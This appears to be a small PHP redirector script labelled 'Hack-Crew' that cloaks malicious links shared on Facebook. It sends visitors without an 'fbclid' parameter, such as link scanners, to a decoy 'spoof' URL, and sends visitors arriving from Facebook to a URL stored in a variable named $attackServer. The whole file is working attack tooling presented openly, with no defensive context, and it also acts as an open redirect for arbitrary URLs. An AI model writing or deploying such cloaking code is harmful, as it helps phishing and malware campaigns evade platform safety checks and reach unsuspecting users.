# Hack-Crew
﻿<?php
$spoofPage=
urlDecode($_GET['spoof']);
$attackServer =
urlDecode($_GET['real']);
if (!hasParam('fbclid'))
{
redirect($spoofPage);
}
else
{
redirect ($attackServer);
}
function redirect($url)
{
ob_start();
header("Location: $url");
exit();
ob_end_flush();
}
function hasParam($param)
{
return array_key_exists($param,
$_GET);
}
?>
